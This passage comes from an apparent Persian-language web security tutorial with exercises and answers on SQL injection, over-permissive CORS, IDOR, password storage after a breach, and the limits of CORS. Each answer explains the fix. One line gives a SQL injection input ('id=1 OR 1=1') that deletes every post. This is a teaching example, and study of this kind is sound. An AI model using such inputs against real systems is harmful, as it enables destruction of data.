- (ب) **تزریق SQL:** \`id=1 OR 1=1\` همه‌ی پست‌ها رو پاک می‌کنه. راه‌حل: \`db.prepare("DELETE FROM posts WHERE id = ?").run(req.query.id)\`، به‌علاوه‌ی یه بررسی مجوز که کاربر اجازه‌ی پاک کردن اون پست رو داره.
- (ج) **CORS بیش‌ازحد باز:** برگردوندن هر مبدأیی همراه مدرک هویت به هر وب‌سایتی اجازه می‌ده جواب‌های خصوصی API کاربرهات رو با کوکی‌های خودشون بخونه. راه‌حل: مبدأ رو با یه فهرست مجاز صریح مقایسه کن و سرآیند رو فقط برای اون‌ها بفرست.
:::
::::

::::exercise
**تمرین ۲.** یه فروشگاه آنلاین سفارش‌ها رو تو \`/orders/1043\` نشون می‌ده. یه مشتری واردشده عدد رو می‌کنه \`/orders/1042\` و اسم، آدرس و خریدهای یه مشتری دیگه رو می‌بینه. اسم این آسیب‌پذیری چیه، تو کدوم مورد OWASP Top 10 جا می‌گیره، و چطور باید درست بشه؟ شناسه‌های تصادفی (مثل UUID) کافین؟

:::answer
این یه **ارجاع مستقیم ناامن به شیء (IDOR)** ـه، بخشی از **کنترل دسترسی شکسته**، شماره‌ی ۱ تو OWASP Top 10 (۲۰۲۱). سرور بررسی می‌کنه کاربر وارد شده، ولی نه این‌که این سفارش **مال اونه**.

**راه‌حل:** تو هر درخواست، سرور مالکیت یا اجازه رو بررسی می‌کنه: \`SELECT ... FROM orders WHERE id = ? AND customer_id = ?\` (با شناسه‌ی کاربر واردشده)، و در غیر این صورت \`404\` (یا \`403\`) جواب می‌ده. بهتره این بررسی تو یه جای مرکزی باشه، تا هیچ نقطه‌ای یادش نره، و آزمایش‌ها پوشش بدنش.

**شناسه‌های تصادفی به‌تنهایی کافی نیستن.** حدس زدن رو سخت‌تر می‌کنن، ولی شناسه‌ها نشت می‌کنن (لینک‌های اشتراکی، لاگ‌ها، تاریخچه)، و اون‌وقت هیچ‌چی جلوی دسترسی رو نمی‌گیره. یه لایه‌ی اضافه‌ان، نه جایگزین مجوزدهی.
:::
::::

::::exercise
**تمرین ۳.** پایگاه داده‌ی رمزهای یه سایت نشت می‌کنه. مقایسه کن مهاجم تو هر حالت چی کار می‌تونه بکنه: (الف) رمزها به شکل متن ساده (ب) هش‌های SHA-256 بی‌نمک (ج) bcrypt با نمک برای هر کاربر. سایت درست بعد از نشت، در هر حال، باید چی کار کنه؟

:::answer
- (الف) **متن ساده:** مهاجم فوراً همه‌ی رمزها رو داره، و رو سایت‌های دیگه (ایمیل، بانک) امتحانشون می‌کنه، چون خیلی‌ها رمزهاشون رو تکرار می‌کنن.
- (ب) **SHA-256 بی‌نمک:** رمزهای رایج با جدول‌های ازپیش‌محاسبه‌شده فوراً پیدا می‌شن؛ بقیه با کارت گرافیک **میلیاردها** بار در ثانیه حدس زده می‌شن، و رمزهای یکسان یه هش دارن.
- (ج) **bcrypt با نمک:** هر حدس وقت واقعی می‌گیره و باید **برای هر کاربر جدا** تکرار بشه. رمزهای خیلی ضعیف هنوز پیدا می‌شن، ولی شکستن میلیون‌ها کاربر غیرعملی می‌شه، و رمزهای قوی امن می‌مونن.

**فوراً، در هر حال:** همه‌ی نشست‌ها رو تموم کن، بازنشانی رمز رو اجباری کن، به کاربرها (و جایی که قانون می‌خواد، به مقام‌ها) خبر بده تا رمزهای تکراری‌شون رو جاهای دیگه عوض کنن، حفره رو ببند، و احراز هویت چندعاملی رو جا بنداز.
:::
::::

::::exercise
**تمرین ۴ (فکر کن، حفظ نکن).** یه برنامه‌نویس می‌گه: «API ما در برابر حمله امنه چون CORS رو طوری تنظیم کردیم که فقط مبدأ فرانت‌اند خودمون مجاز باشه.» توضیح بده CORS واقعاً از چی محافظت می‌کنه، دو تا حمله بگو که جلوشون رو نمی‌گیره، و بگو API به‌جاش چی لازم داره.

:::answer
**CORS چی کار می‌کنه:** به **مرورگرها** می‌گه جاوااسکریپت یه صفحه از یه مبدأ دیگه اجازه داره جواب رو **بخونه** یا نه. با پیکربندی این برنامه‌نویس، یه اسکریپت رو \`evil.example\` که تو مرورگر یه قربانی اجرا می‌شه نمی‌تونه جواب‌های API رو بخونه. این از خونده شدن داده‌ی کاربرها توسط سایت‌های دیگه از راه مرورگر خودشون محافظت می‌کنه، و همین.

**چیزهایی که جلوشون رو نمی‌گیره:**

1. **درخواست‌های مستقیم بیرون از مرورگر:** \`curl\`، اسکریپت‌های پایتون یا ربات‌ها اصلاً CORS رو اجرا نمی‌کنن. هر کسی می‌تونه هر نقطه‌ای رو مستقیم صدا بزنه، پس نبودن احراز هویت یا مجوزدهی کاملاً قابل سوءاستفاده‌ست.
2. **درخواست‌هایی که فرستاده می‌شن ولی خونده نمی‌شن:** یه \`POST\` بین‌مبدأ ساده (مثلاً یه فرم) هنوز به سرور **می‌رسه** و اثرش رو می‌ذاره؛ فقط جوابش پنهان می‌شه. اگه API از کوکی استفاده کنه، این همون CSRF ـه.

**چیزی که API لازم داره:** احراز هویت رو هر نقطه‌ی غیرعمومی (توکن یا کوکی نشست)، مجوزدهی سمت سرور برای هر منبع، اعتبارسنجی ورودی و پرس‌وجوهای پارامتری، محافظت CSRF اگه از کوکی استفاده می‌شه (\`SameSite\`، توکن، بررسی \`Origin\`)، محدودیت نرخ، و HTTPS. CORS یه تنظیمه که دسترسی مشروع مرورگر رو مجاز می‌کنه؛ دیوار امنیتی نیست.
:::
::::
`;export{e as default};